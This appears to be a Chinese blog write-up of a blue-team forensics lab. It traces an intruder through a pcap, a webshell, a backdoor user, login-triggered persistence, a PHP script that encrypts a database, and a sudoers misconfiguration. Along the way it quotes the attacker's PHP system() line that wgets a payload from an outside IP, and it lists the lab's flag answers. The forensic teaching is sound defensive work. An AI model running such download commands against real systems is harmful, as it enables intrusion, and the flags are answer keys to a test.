@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>第九章-blueteam 的小心思 | Zephyr</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&display=swap" rel="stylesheet">
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg">
+<link rel="stylesheet" href="/css/style.css">
+<meta name="generator" content="Hexo 8.1.2"></head>
+<body>
+
+<canvas id="particles"></canvas>
+<div class="progress-bar" id="progressBar"></div>
+
+
+<nav class="top-nav" id="topNav">
+  <div class="nav-left">
+    <a href="/" class="nav-brand">Zephyr</a>
+    <a href="https://github.com/Zephyr1ng" class="nav-github" target="_blank" rel="noopener">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
+      GitHub
+    </a>
+  </div>
+  <ul class="nav-links">
+    
+      <li><a href="/">文章</a></li>
+    
+      <li><a href="/categories">分类</a></li>
+    
+      <li><a href="/archives">归档</a></li>
+    
+      <li><a href="/friends">友链</a></li>
+    
+      <li><a href="/about">关于</a></li>
+    
+  </ul>
+</nav>
+
+<div class="container">
+  <!-- Single post page -->
+<article class="post-full">
+  <header class="post-header">
+    <a href="/" class="back-link">← Home</a>
+    <h1 class="post-title">第九章-blueteam 的小心思</h1>
+    <div class="post-meta">
+      <time datetime="2025-02-28">2025-02-28</time>
+      
+    </div>
+  </header>
+
+  <div class="post-content">
+    <blockquote>
+<p>本文迁移自博客园，原文链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Zephyr07/articles/18743041">https://www.cnblogs.com/Zephyr07/articles/18743041</a></p>
+</blockquote>
+<h2 id="1-攻击者通过什么密码成功登录了网站的后台？提交密码字符串的小写md5值，格式flag-md5-。"><a href="#1-攻击者通过什么密码成功登录了网站的后台？提交密码字符串的小写md5值，格式flag-md5-。" class="headerlink" title="1.攻击者通过什么密码成功登录了网站的后台？提交密码字符串的小写md5值，格式flag{md5}。"></a>1.攻击者通过什么密码成功登录了网站的后台？提交密码字符串的小写md5值，格式flag{md5}。</h2><p>要看登录，那就去看服务器的access.log文件<br>然后筛选login的请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/apache2/access.log | grep &quot;POST /login&quot;</span><br></pre></td></tr></table></figure>
+
+<p>但是有一个很尴尬的事情post请求就是看不到账号密码，所以只好换一种方式<br>用finalshell在根目录下发现一个流量包，直接下载下来扔到wireshark里面分析</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;login.php&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然后总共没几条，一条一条看就ok了</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228131321639-1201181658.png"></p>
+<h2 id="2-攻击者在哪个PHP页面中成功上传了后门文件？例如upload-php页面，上传字符串”upload-php”的小写md5值，格式flag"><a href="#2-攻击者在哪个PHP页面中成功上传了后门文件？例如upload-php页面，上传字符串”upload-php”的小写md5值，格式flag" class="headerlink" title="2.攻击者在哪个PHP页面中成功上传了后门文件？例如upload.php页面，上传字符串”upload.php”的小写md5值，格式flag"></a>2.攻击者在哪个PHP页面中成功上传了后门文件？例如upload.php页面，上传字符串”upload.php”的小写md5值，格式flag</h2><p>一般文件上传请求包中会有boundary，主要是用来准确提取文件数据和元数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;boundary&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然后分析文件内容发现在一个zip文件中有一个cpg.php，里面有一句话木马，所以直接wireshark那一条流量包的那个php文件就是上传后门文件的php页面<br>pluginmgr.php<br>flag{B05C0BE368FFA72E6CB2DF7E1E1B27BE}</p>
+<h2 id="3-找到攻击者上传的webshell文件，提交该文件的小写md5值，格式flag"><a href="#3-找到攻击者上传的webshell文件，提交该文件的小写md5值，格式flag" class="headerlink" title="3.找到攻击者上传的webshell文件，提交该文件的小写md5值，格式flag"></a>3.找到攻击者上传的webshell文件，提交该文件的小写md5值，格式flag</h2><p>d盾直接把目录下载下来查杀即可</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228131344765-67863599.png"></p>
+<p>其实就是上一题中那个zip文件中的php文件<br>flag{a097b773ced57bb7d51c6719fe8fe5f5}</p>
+<h2 id="4-攻击者后续又下载了一个可执行的后门程序，提交该文件的小写md5值，格式flag"><a href="#4-攻击者后续又下载了一个可执行的后门程序，提交该文件的小写md5值，格式flag" class="headerlink" title="4.攻击者后续又下载了一个可执行的后门程序，提交该文件的小写md5值，格式flag"></a>4.攻击者后续又下载了一个可执行的后门程序，提交该文件的小写md5值，格式flag</h2><p>看流量包，大小为1037的cpg.php发现了异常</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228131353219-2013441166.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m3=system(&quot;wget http://124.221.70.199:8889/is.world&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>wget是个下载命令，所以显而易见is.word就是又下载的后门程序</p>
+<h2 id="5-攻击者创建了后门用户的名称是？例如attack恶意用户，上传字符串”attack”的小写md5值，格式flag"><a href="#5-攻击者创建了后门用户的名称是？例如attack恶意用户，上传字符串”attack”的小写md5值，格式flag" class="headerlink" title="5.攻击者创建了后门用户的名称是？例如attack恶意用户，上传字符串”attack”的小写md5值，格式flag"></a>5.攻击者创建了后门用户的名称是？例如attack恶意用户，上传字符串”attack”的小写md5值，格式flag</h2><p>直接上命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>找和root权限一样高的用户就行（一般就在用户列表的最下面）</p>
+<p>md5 knowledgegraphd<br>flag{4cda3461543c9a770a3349760594facd}</p>
+<h2 id="6-攻击者创建了一个持久化的配置项，导致任意用户登录就会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag"><a href="#6-攻击者创建了一个持久化的配置项，导致任意用户登录就会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag" class="headerlink" title="6.攻击者创建了一个持久化的配置项，导致任意用户登录就会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag"></a>6.攻击者创建了一个持久化的配置项，导致任意用户登录就会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag</h2><p>看&#x2F;etc&#x2F;profile目录下的内容就行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/profile</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;etc&#x2F;profile 文件的内容，这是一个系统范围的配置文件</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228131448686-922581873.png"></p>
+<p>● 首先，这段代码检查是否存在交互式 shell 的环境变量 ${PS1-}。如果存在，它会进一步检查是否在 Bash 环境下，并且 Bash 的路径不是 &#x2F;bin&#x2F;sh。<br>● 如果是 Bash，并且存在 &#x2F;etc&#x2F;bash.bashrc 文件，则会载入该文件的配置。<br>● 如果当前用户是 root 用户（通过 id -u 命令检查），则设置提示符 PS1 为 #，表示超级用户权限。否则设置为 $，表示普通用户权限。<br>● 接下来就是黑客插入的后门程序：&#x2F;var&#x2F;www&#x2F;html&#x2F;plugins&#x2F;“. “&#x2F;is.world &amp;，它是一个恶意添加的行，试图运行一个不明的命令或程序。<br>● 最后，如果 &#x2F;etc&#x2F;profile.d 目录存在，则会加载该目录下所有可读的 .sh 结尾的脚本文件，以扩展 shell 的配置<br>&#x2F;etc&#x2F;profile<br>flag{65bf3e4a9ac90d75ec28be0317775618}</p>
+<h2 id="7-攻击者创建了一个持久化的配置项，导致只有root用户登录才会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag-md5-。"><a href="#7-攻击者创建了一个持久化的配置项，导致只有root用户登录才会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag-md5-。" class="headerlink" title="7.攻击者创建了一个持久化的配置项，导致只有root用户登录才会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag{md5}。"></a>7.攻击者创建了一个持久化的配置项，导致只有root用户登录才会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag{md5}。</h2><p>这个题和上面那个题的区别在于这个是只有root用户登录才会被触发<br>cat &#x2F;root&#x2F;.bashrc<br>如果黑客希望在只有root用户登录时才触发后门连，其它用户则不会，那他一般会挑选以下文件和目录；</p>
+<p>1、“&#x2F;root&#x2F;.bashrc”：在root用户登录Bash Shell时执行；<br>2、“&#x2F;root&#x2F;.bash_profile”：在root用户登录时执行。<br>3、“&#x2F;root&#x2F;.profile”：在root用户登录时执行。<br>4、“&#x2F;etc&#x2F;profile”：所有用户登录时执行，但可以通过特定的条件使其仅在root用户登录时触发。（这个概率就非常大，且也符合我们的猜测）<br>5、“&#x2F;etc&#x2F;rc.local”：系统启动时执行，可以包含条件逻辑；</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228131530186-1009206131.png"></p>
+<p>这是一个python的经典反弹shell<br>&#x2F;root&#x2F;.bashrc<br>flag{4acc9c465eeeb139c194893ec0a8bcbc}</p>
+<h2 id="8-攻击者加密了哪个数据库？提交数据库的文件夹名，例如user数据库对应存放位置为user文件夹，上传字符串”user”的小写md5值，格式flag"><a href="#8-攻击者加密了哪个数据库？提交数据库的文件夹名，例如user数据库对应存放位置为user文件夹，上传字符串”user”的小写md5值，格式flag" class="headerlink" title="8.攻击者加密了哪个数据库？提交数据库的文件夹名，例如user数据库对应存放位置为user文件夹，上传字符串”user”的小写md5值，格式flag"></a>8.攻击者加密了哪个数据库？提交数据库的文件夹名，例如user数据库对应存放位置为user文件夹，上传字符串”user”的小写md5值，格式flag</h2><p>用navicat连接数据库更好看一点<br>数据库的登录信息（账号密码），一般都会储存在配置文件“config.inc.php”中</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228131539084-47801443.png"></p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228131545316-1075905017.png"></p>
+<p>一个一个点击进去查（表也就那么多），看看那张表点不开或者报错的，那就是有毛病呗，就是题目要求的有锁呗；<br>最后也是在“JPMorgan Chase”数据库中发现它打不开（啥都打不开）；<br>JPMorgan@0020Chase<br>flag{0928a5424aa6126e5923980ca103560e}</p>
+<h2 id="9-解密数据库，提交Harper用户对应Areer的值。提交Areer值的小写md5值，格式flag"><a href="#9-解密数据库，提交Harper用户对应Areer的值。提交Areer值的小写md5值，格式flag" class="headerlink" title="9.解密数据库，提交Harper用户对应Areer的值。提交Areer值的小写md5值，格式flag"></a>9.解密数据库，提交Harper用户对应Areer的值。提交Areer值的小写md5值，格式flag</h2><p>查找一下比文件“cpg.php“新，又比闻文件“Balance.frm”旧的所有文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -newer /var/www/html/plugins/cpg.php ! -newer /var/lib/mysql/JPMorgan@0020Chase/Balance.frm</span><br></pre></td></tr></table></figure>
+
+<p>● &#x2F;: 从根目录开始查找。<br>● -type f: 只查找文件（不包括目录、链接等）。<br>● -newer &#x2F;var&#x2F;www&#x2F;html&#x2F;plugins&#x2F;cpg.php: 找出比这个文件新的文件。<br>● ! -newer &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;JPMorgan@0020Chase&#x2F;Balance.frm: 找出比这个文件旧的文件。</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228131612812-997944763.png"></p>
+<p>总共也没几个php文件了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/lib/mysql/clockup.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228131624665-596724702.png"></p>
+<p>这个PHP脚本的作用是对指定目录下的所有文件进行加密，指定目录就是“&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;JPMorgan@0020Chase”<br>(把代码发给gpt，直接写一个反推的脚本即可)<br>其实就是一个时间戳做作key，固定字符串的hash值前16位作iv进行aes-cbc加密，对应解密即可<br>php 123.php<br>sudo systemctl restart mysql &#x2F;&#x2F;重启数据库<br>然后返回navicat查看即可正常查看</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228131632389-1726568277.png"></p>
+<p>flag{8fd82b8864d71ed7fa12b59e6e34cd1c}</p>
+<h2 id="10-因为什么文件中的漏洞配置，导致了攻击者成功执行命令并提权。提交该文件的小写md5值，格式flag"><a href="#10-因为什么文件中的漏洞配置，导致了攻击者成功执行命令并提权。提交该文件的小写md5值，格式flag" class="headerlink" title="10.因为什么文件中的漏洞配置，导致了攻击者成功执行命令并提权。提交该文件的小写md5值，格式flag"></a>10.因为什么文件中的漏洞配置，导致了攻击者成功执行命令并提权。提交该文件的小写md5值，格式flag</h2><p>既然说了提权那我们就可以直接使用命令查找系统中以 root 用户身份拥有并设置了 SUID（Set User ID）权限的文件<br>简单来说是为了查找被黑客利用的具有 SUID 权限的文件。设置了 SUID 位的文件在执行时将以文件所有者（通常是 root 用户）的权限运行，而不是以执行者的权限运行。黑客可能会利用这些文件进行提权攻击，即通过这些文件获取 root 权限，从而对系统进行更高权限的操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>find &#x2F;: 从根目录开始查找文件。<br>● -user root: 查找所有属于 root 用户的文件。<br>● -perm -4000: 查找设置了 SUID 位的文件（即特殊权限位）。<br>● 4000 是八进制表示法，用于指定 SUID 位。<br>● -perm -4000 意味着查找具有 SUID 权限的文件，无论其他权限如何。<br>● 2&gt;&#x2F;dev&#x2F;null: 将标准错误输出重定向到 &#x2F;dev&#x2F;null，即忽略错误信息（例如没有权限访问的目录）。</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228131703859-920954497.png"></p>
+<p>看到一个常见linux提权工具sudo,又想到sudo也报过漏洞<br>所以进一步分析一下&#x2F;etc&#x2F;sudoers<br>&#x2F;etc&#x2F;sudoers 包含了系统上 sudo 的配置和权限设置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/sudoers</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228131710020-1862963033.png"></p>
+<p>NOPASSWD 选项：<br>● 任何无需密码验证的 sudo 配置都可能带来危害，因为它为潜在的攻击者提供了绕过身份验证的途径。<br>● 在这个案例中，虽然只允许执行 systemctl status apache2.service，存在某种漏洞，肯定会导致执行其它命令或达到提权的效果。<br>&#x2F;etc&#x2F;sudoers<br>flag{6585817513b0ea96707ebb0d04d6aeff}</p>
+
+  </div>
+
+  <!-- Donation Section -->
+  <div class="donation">
+    <div class="donation-divider">
+      <span>如果文章对你有帮助</span>
+    </div>
+    <p class="donation-hint">可以请我喝杯咖啡 ☕</p>
+    <div class="donation-qrs">
+      <div class="qr-card">
+        <img src="/images/alipay.jpg" alt="支付宝收款码" onerror="this.parentElement.style.display='none'">
+        <span>支付宝</span>
+      </div>
+      <div class="qr-card">
+        <img src="/images/wechat.jpg" alt="微信收款码" onerror="this.parentElement.style.display='none'">
+        <span>微信</span>
+      </div>
+    </div>
+  </div>
+
+  
+  <nav class="post-nav">
+    
+      <a href="/2025/02/28/%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E5%AE%9E%E6%88%98%E7%AF%87-%E8%BF%90%E7%BB%B4%E6%9D%B0%E5%85%8B/" class="prev">← 第九章-实战篇-运维杰克</a>
+    
+    
+      <a href="/2025/02/28/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-java02-shiro/" class="next">第八章 内存马分析-java02-shiro →</a>
+    
+  </nav>
+  
+</article>
+
+</div>
+
+<script src="/js/main.js"></script>
+</body>
+</html>
